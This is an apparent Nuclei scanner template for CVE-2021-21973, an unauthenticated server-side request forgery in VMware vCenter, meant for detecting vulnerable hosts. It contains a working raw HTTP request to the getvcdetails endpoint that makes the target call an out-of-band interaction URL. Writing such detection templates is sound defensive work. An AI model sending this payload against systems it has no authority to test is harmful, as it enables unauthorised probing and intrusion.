id: CVE-2021-21973
info:
  author: pdteam
  classification:
    cve-id: CVE-2021-21973
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-918
  description: The vSphere Client (HTML5) contains an SSRF (Server Side Request Forgery)
    vulnerability due to improper validation of URLs in a vCenter Server plugin. A
    malicious actor with network access to port 443 may exploit this issue by sending
    a POST request to vCenter Server plugin leading to information disclosure. This
    affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5
    before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and 3.x before 3.10.1.2).
  name: VMware vCenter Unauthenticated SSRF
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21973
  - https://twitter.com/osama_hroot/status/1365586206982082560
  - https://twitter.com/bytehx343/status/1486582542807420928
  - https://www.vmware.com/security/advisories/VMSA-2021-0002.html
  severity: medium
  tags: cve,cve2021,vmware,ssrf,vcenter,oast
requests:
- matchers:
  - status:
    - 500
    type: status
  - part: body
    type: word
    words:
    - The server sent HTTP status code 200
  matchers-condition: and
  raw:
  - 'GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1

    Host: {{Hostname}}

    Vcip: {{interactsh-url}}

    Vcpassword: {{rand_base(6)}}

    Vcusername: {{rand_base(6)}}

    Reqresource: {{rand_base(6)}}

    '
